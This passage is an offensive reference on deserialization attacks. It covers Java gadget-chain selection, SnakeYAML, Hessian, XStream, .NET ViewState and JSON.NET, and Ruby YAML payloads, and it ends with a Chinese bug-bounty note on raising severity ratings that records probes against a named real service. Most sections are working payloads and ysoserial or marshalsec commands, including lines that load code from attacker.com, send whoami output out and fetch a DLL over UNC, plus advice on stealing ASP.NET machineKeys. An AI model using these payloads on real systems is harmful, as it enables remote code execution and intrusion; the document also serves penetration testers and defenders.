| **CC1** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 (InvokerTransformer filter) | `Runtime.exec()` |
| **CC2** | Commons Collections 4.x | 4.0 | None (uses `TemplatesImpl`) | Bytecode execution |
| **CC3** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 | `TemplatesImpl` (bytecode) |
| **CC4** | Commons Collections 4.x | 4.0 | None | `TemplatesImpl` |
| **CC5** | Commons Collections 3.x | 3.0–3.2.1 | JDK ≥ 8 OK (no `InvokerTransformer` check needed) | `Runtime.exec()` via `TiedMapEntry` |
| **CC6** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `HashSet` trigger |
| **CC7** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `Hashtable` |

**Recommended priority**: CC6 → CC7 → CC5 (broadest compatibility, no JDK version constraint).

### 1.2 CommonsBeanutils Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **CB1** | Commons BeanUtils 1.x + Commons Collections 3.x | BU 1.6.1–1.9.4, CC ≤ 3.2.1 | `PropertyUtils.getProperty` → `TemplatesImpl` |
| **CB1 (no-CC)** | Commons BeanUtils 1.x only | BU 1.8.3–1.9.4 | Requires `commons-logging`; no CC dependency |

### 1.3 Spring Framework Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **Spring1** | Spring Core + Spring Beans | 4.1.4 (known), varies | `MethodInvokeTypeProvider` → `TemplatesImpl` |
| **Spring2** | Spring Core | 4.1.4 | `ObjectFactoryDelegatingInvocationHandler` |

### 1.4 JDK-Only Chains (No External Dependencies)

| Chain | JDK Version | Notes |
|---|---|---|
| **Jdk7u21** | JDK 7u21 | `AnnotationInvocationHandler` + `TemplatesImpl`; patched in 7u25 |
| **JRMPClient** | All | Triggers JRMP call to attacker RMI server (not direct RCE, but enables chaining) |
| **JRMPListener** | All | Opens RMI listener on victim (less useful) |
| **URLDNS** | All | DNS-only; confirmation probe, no RCE |

### 1.5 Other Notable Chains

| Chain | Library | Notes |
|---|---|---|
| **Groovy1** | Groovy 1.7–2.4 | `MethodClosure` + `ConvertedClosure` |
| **Hibernate1** | Hibernate 5.x (with `javassist` or `cglib`) | `BasicLazyInitializer` → `TemplatesImpl` |
| **Hibernate2** | Hibernate 5.x | Via `AbstractComponentTuplizer` |
| **JBossInterceptors1** | JBoss Interceptors + weld-core | Rarely seen in modern apps |
| **Myfaces1** | Apache MyFaces 1.x | `ViewState` deserialization |
| **Myfaces2** | Apache MyFaces 2.x | `ViewState` deserialization |
| **ROME** | ROME 1.0 | `ObjectBean` → `EqualsBean` → `ToStringBean` |
| **Vaadin1** | Vaadin framework | `PropertysetItem` chain |
| **Wicket1** | Apache Wicket | Requires specific classpath setup |
| **C3P0** | C3P0 connection pool | `PoolBackedDataSource` → JNDI or URL classloading |
| **Clojure** | Clojure runtime | `core$fn` → arbitrary function execution |
| **BeanShell1** | BeanShell 2.x | `XThis` + `Interpreter.eval()` |
| **Jython1** | Jython | `PyFunction` → arbitrary Python execution in JVM |
| **MozillaRhino1/2** | Mozilla Rhino JS engine | `NativeJavaObject` chains |

### 1.6 Chain Selection Decision Tree

```
Identify target libraries (error messages, pom.xml, /META-INF/MANIFEST.MF):
├── Commons Collections 3.x on classpath?
│   ├── JDK < 8u72 → CC1, CC3
│   └── JDK ≥ 8u72 → CC5, CC6, CC7
├── Commons Collections 4.x?
│   └── CC2, CC4
├── Commons BeanUtils?
│   └── CB1 (with or without CC)
├── Spring Framework?
│   └── Spring1, Spring2
├── Groovy?
│   └── Groovy1
├── Hibernate + javassist/cglib?
│   └── Hibernate1, Hibernate2
├── No external libs identified?
│   ├── Try URLDNS first (confirmation)
│   ├── JDK 7u21 → Jdk7u21
│   └── JRMPClient → chain to RMI server with full gadget
└── Unknown? Try CC6, then CB1, then URLDNS
```

---

## 2. SNAKEYAML GADGET

### 2.1 Concept

SnakeYAML (Java YAML parser) supports constructing arbitrary Java objects via `!!` tag. When `Yaml.load()` is called on untrusted input without `SafeConstructor`, it instantiates any class.

### 2.2 ScriptEngineManager / URLClassLoader

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

**Exploit flow**:
1. SnakeYAML constructs `URLClassLoader` pointing to attacker JAR
2. Constructs `ScriptEngineManager` using that classloader
3. `ScriptEngineManager` uses `ServiceLoader` → loads `META-INF/services/javax.script.ScriptEngineFactory`
4. Attacker's JAR contains malicious `ScriptEngineFactory` implementation → RCE

**Attacker JAR structure**:
```
exploit.jar/
├── META-INF/
│   └── services/
│       └── javax.script.ScriptEngineFactory → "Exploit"
└── Exploit.class  (implements ScriptEngineFactory, executes commands in static block)
```

### 2.3 SPI-Based Variants

```yaml
# ProcessBuilder (direct command execution, Java 9+):
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://attacker.com/pwned"]]
]

# Alternative URLClassLoader form:
!!java.beans.XMLDecoder
  <java>
    <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec"><string>calc</string></void>
    </object>
  </java>
```

### 2.4 Detection

```
# Indicators in HTTP traffic:
- Content-Type: application/x-yaml
- Content-Type: text/yaml
- YAML content with !! tags in POST body, file uploads, config endpoints
- Spring Cloud Config Server endpoints accepting YAML

# Test probe (DNS-based safe detection):
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://UNIQUE.burpcollaborator.net/probe"]
  ]]
]
```

---

## 3. HESSIAN / KRYO / AVRO DESERIALIZATION

### 3.1 Hessian

Caucho Hessian is a binary web-service protocol. Hessian's `HessianInput.readObject()` can deserialize arbitrary Java objects.

```
# Traffic fingerprint:
- Content-Type: x-application/hessian
- Content-Type: application/x-hessian
- Binary starting with: 'c' (call), 'H' (Hessian 2.0), 'r' (reply)
- URL patterns: /hessian, /remoting/*, /service/*

# Known vulnerable configurations:
- Spring Remoting with HessianServiceExporter
- Resin application server (Caucho)
- Dubbo RPC framework (Apache)
```

**Hessian gadget chains** (via `marshalsec` tool):

```bash
# Generate Hessian payload:
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "ldap://attacker.com:1389/Exploit"

# Hessian2 variant:
java -cp marshalsec.jar marshalsec.Hessian2 \
  SpringAbstractBeanFactoryPointcutAdvisor \
  "ldap://attacker.com:1389/Exploit"
```

**Common Hessian gadgets**:
- `SpringPartiallyComparableAdvisorHolder` → JNDI lookup
- `SpringAbstractBeanFactoryPointcutAdvisor` → JNDI lookup
- `Rome` → `EqualsBean` → `ToStringBean` → JNDI or `TemplatesImpl`
- `Resin` → `QName` → classloading

### 3.2 Kryo

Kryo is a fast Java serialization framework (often used in Spark, Storm, Akka).

```
# Traffic fingerprint:
- Binary format, no standard magic bytes
- Often in message queues (Kafka, RabbitMQ) rather than HTTP
- Configuration key: kryo.setRegistrationRequired(false) → vulnerable

# Exploit approach:
# If registration is NOT required, any class can be deserialized
# Use standard Java gadgets (CC chains work if on classpath)

# If registration IS required but includes dangerous classes:
# Look for: java.net.URL, javax.management.*, java.lang.ProcessBuilder
```

### 3.3 Apache Avro

```
# Traffic fingerprint:
- Content-Type: avro/binary, application/avro
- Uses schema registry in many deployments
- Binary format with schema-defined structure

# Avro deserialization is schema-bound (generally safer)
# BUT: Avro's Java reflection API can be abused if:
# - Schema specifies "java-class" property
# - Custom deserializers are registered
# - GenericDatumReader with ReflectDatumReader
```

### 3.4 XStream

```
# Traffic fingerprint:
- XML with <sorted-set>, <dynamic-proxy>, <tree-map> elements
- Often used in Jenkins, Bamboo, TeamCity

# Payload (pre-1.4.7):
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# Tool: marshalsec supports XStream payloads
java -cp marshalsec.jar marshalsec.XStream ImageIO "calc"
```

---

## 4. .NET VIEWSTATE DESERIALIZATION

### 4.1 ViewState Structure

```
__VIEWSTATE is a hidden form field in ASP.NET WebForms:
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />

Structure (after base64 decode):
- Serialized object graph (LosFormatter → ObjectStateFormatter → BinaryFormatter)
- Optional MAC (message authentication code) — HMAC-SHA1/SHA256
- Optional encryption — AES
```

### 4.2 machineKey Requirement

ViewState MAC/encryption uses keys from `web.config`:

```xml
<machineKey
  validationKey="HEXKEY_FOR_MAC"
  decryptionKey="HEXKEY_FOR_ENCRYPTION"
  validation="SHA1"
  decryption="AES" />
```

**How to obtain machineKey**:
1. LFI/path traversal → read `web.config`
2. Information disclosure (error pages, debug endpoints)
3. Known default keys in specific products (SharePoint, DotNetNuke)
4. `.config` backup files left on server
5. Azure App Service: sometimes in `WEBSITE_AUTH_ENCRYPTION_KEY` env var

### 4.3 ViewState Forgery

```bash
# With known machineKey — generate malicious ViewState:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_PAYLOAD" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX" \
  --islegacy

# Without encryption (enableViewStateMac=false or older .NET):
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\out.txt" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX"
```

### 4.4 ViewState Attacks Without machineKey

```
# .NET Framework < 4.5 with enableViewStateMac="false" in web.config:
# No MAC → directly craft malicious ViewState

# Blacklist3r tool: try known/default keys:
Blacklist3r.exe --viewstate "BASE64_VIEWSTATE" --path "/page.aspx" --apppath "/"
# Tests common validation/decryption key pairs

# ASP.NET __VIEWSTATEGENERATOR value:
# Helps identify the target page's ViewState key derivation
# Format: 8 hex chars in hidden field
```

### 4.5 JSON.NET TypeNameHandling Exploitation

```json
// Vulnerable configuration:
// JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
//     TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
// });

// Payload — ObjectDataProvider chain:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}

// Alternative: System.Configuration.Install.AssemblyInstaller
// Triggers assembly load from attacker-controlled path
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
  "Path": "\\\\attacker.com\\share\\payload.dll"
}
```

---

## 5. RUBY YAML.load vs YAML.safe_load

### 5.1 Why YAML.load Is Dangerous

`YAML.load` in Ruby constructs arbitrary Ruby objects via `!ruby/object:` tags. It is equivalent to `Marshal.load` or Java's `ObjectInputStream.readObject()` in terms of attack surface.

### 5.2 Version-Specific Exploits

**Ruby ≤ 2.7.2** — `Gem::Requirement` chain (simplest):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://attacker.com/pwned"
```

**Ruby 2.x–3.x** — `Gem::Installer` chain (complex but broader):

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: "curl http://attacker.com/$(whoami)"
      method_id: :resolve
```

### 5.3 Detection in the Wild

```ruby
# Vulnerable patterns in source code:
YAML.load(user_input)
YAML.load(File.read(user_controlled_path))
YAML.load(params[:config])

# Safe alternatives:
YAML.safe_load(input)
YAML.safe_load(input, permitted_classes: [Symbol, Date])
Psych.safe_load(input)
```

### 5.4 Psych YAML Parser Versions

| Ruby Version | Psych Version | YAML.load Behavior |
|---|---|---|
| ≤ 2.0 | Psych 2.x | Arbitrary object construction |
| 2.1–2.7 | Psych 3.x | Arbitrary (YAML.load deprecated warning in 2.6+) |
| 3.0 | Psych 3.3 | YAML.load warns, still works |
| 3.1+ | Psych 4.0 | YAML.load defaults to safe_load behavior; need `unsafe_load` |

---

## 6. DETECTION FINGERPRINTS — MAGIC BYTES TABLE

### 6.1 By Protocol / Format

| Magic Bytes (Hex) | Base64 Prefix | Format | Language |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java Serialized Object | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter (ViewState) | .NET |
| `80 02` or `80 03` or `80 04` or `80 05` | Varies | Python pickle (protocol 2/3/4/5) | Python |
| `89 50 4E 47` | `iVBOR` | PNG (may contain phar polyglot) | PHP |
| `4F 3A` | `Tz` (base64 of `O:`) | PHP serialized object (`O:N:"Class"`) | PHP |
| `61 3A` | `YT` (base64 of `a:`) | PHP serialized array (`a:N:{`) | PHP |
| `04 08` | Varies | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip (may wrap serialized data) | Any |
| `48 02` or `63` | Varies | Hessian (2.0 / 1.0) | Java |

### 6.2 By Content-Type Header

| Content-Type | Likely Format | Risk |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | Critical |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | Critical |
| `x-application/hessian` | Hessian binary | Critical |
| `application/x-hessian` | Hessian binary | Critical |
| `application/x-amf` | AMF (Flash) — often wraps Java | High |
| `application/x-yaml` / `text/yaml` | YAML (check for `!!` tags) | High (if YAML.load) |
| `application/java-archive` | JAR file | Context-dependent |
| `application/x-protobuf` | Protobuf (generally safe) | Low |
| `application/json` with `$type` | JSON.NET with TypeNameHandling | Critical |
| `application/xml` with suspicious elements | XStream / XMLDecoder | Critical |

### 6.3 By Cookie / Parameter Name

| Name Pattern | Likely Format | Product |
|---|---|---|
| `rememberMe` | Java serialized + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET (associated with ViewState) | ASP.NET WebForms |
| `JSESSIONID` + binary cookie | Java serialized | Various Java servers |
| `rack.session` | Ruby Marshal (base64) | Ruby on Rails / Rack |
| `_session_id` + binary | Python pickle or JSON | Django / Flask |
| `connect.sid` | Node.js session (usually JSON, but check) | Express |
| `ci_session` | PHP serialized | CodeIgniter |
| `PHPSESSID` + serialized data | PHP serialized | PHP applications |

### 6.4 Quick Identification Script

```bash
# Check if base64-decoded data matches known magic bytes:
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java: look for "ac ed 00 05"
# .NET BinaryFormatter: look for "00 01 00 00 00 ff ff ff ff"
# Python pickle: look for "80 0N" where N is protocol version
# PHP: decode and look for "O:" or "a:" prefix
```

---

## 7. TOOLING QUICK REFERENCE

| Tool | Language | Purpose |
|---|---|---|
| **ysoserial** | Java | Java gadget chain payload generation |
| **ysoserial.net** | .NET | .NET gadget chain payload generation |
| **marshalsec** | Java | Hessian, XStream, JNDI, multiple format payloads |
| **PHPGGC** | PHP | PHP gadget chain generation (Laravel, Symfony, etc.) |
| **pimpmykali/ysoserial-modified** | Java | Extended ysoserial with more chains |
| **GadgetInspector** | Java | Automated gadget chain discovery in classpaths |
| **Blacklist3r** | .NET | ViewState key testing and forging |
| **SerializationDumper** | Java | Decode and inspect Java serialized objects |
| **jdeserialize** | Java | Parse Java serialization stream for analysis |

```bash
# ysoserial — try all chains with DNS callback:
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```

---

## ★★★ 定级天花板自检：别停在「打不动」，去把 `03` 的升级门槛逐条对（2026-09-24 亲例）

**问题**：某点已判"打不通 RCE"，定级还能不能更高？**别凭感觉 —— 去读 `03` 逐条对。**

### 四步法

1. **读 `03` 的两组升级门槛**（严重 3 条 / 高危 4 条）＋ 「不写」清单，**逐条**对照本点能否命中；
2. ★ **先看「不写」清单** —— 它常常直接砍掉你正打算走的那条路。
   亲例：`03` 明写「**滑块/无限试密（没进号）**」不写 ⇒
   **绕过验证码但没进号，连中危都不够** ⇒ "绕验证码"这条路**不值得花力气**；
3. ★★ **找出「你唯一没测过的那一维」，把它测掉**；
4. 把"什么变了就能升级"写成**可执行的条件清单**，并注明**是否在攻击者一侧**。

### 亲例（乐信 datashare 的 fastjson 点）

- 升级门槛里**只有「注入出了他主体的数」这一维没测过**（RCE / 进号 / 数据面此前都已排除）；
- 而该接口的**唯一 JSON 入口是 `param`** ⇒ 去测 `param` 的**字段级注入**；
- ★★ **字段名从 SDK 前端拿，绝不猜**：抓「验证码 SDK」的前端 JS ⇒ 读出其支持的三形态，
  `param` 必为其一：`TXN{ticket,randstr}` / `JY{challenge,seccode,validate}` /
  `JY4{lot_number,captcha_output,pass_token,gen_time,sign_token}`；
- 逐形态打进**单引号** ＋ **3000 字符超长值** ⇒ **响应全部与基线同形**（79 B 验证码不通过）
  ⇒ **既无 1064 语法错、也无 1265/1292 长度/类型错** ⇒ **字段没被 SQL 消费 ⇒ 注入面不存在**；
- ★ **排混淆**：出现变化的那一发（43 B）经 4 发对照证实是「**param 缺失**」造成、**与单引号无关**
  （`C1 不带param+正常` = `C2 不带param+带'` = 43B；`C3/C4 带param` = 79B）
  ⇒ 顺带得到硬结论：**服务端在验证码校验之前完全不消费 `userid`**
  （这解释了早前对 `userid` 放 fastjson 探针为何无反应 —— 不是"不吃 JSON"，是**没走到用它的那一步**）。

### 产出必须有三样

① **逐条对照表**（每条给实测依据，不能写"应该不成立"）；
② **唯一没测维度的实测结论**；
③ **升级条件清单** —— "都不在可攻击的一侧"这句话，**只有把三条都列出来才站得住**。

★ **反面教材**：直接把"打不动 RCE"写成"中危/低危"而不做这个自检 ⇒
要么漏掉一条能升的，要么**把能升的说成不能**（后者更伤：等于替厂商把报告写小了）。
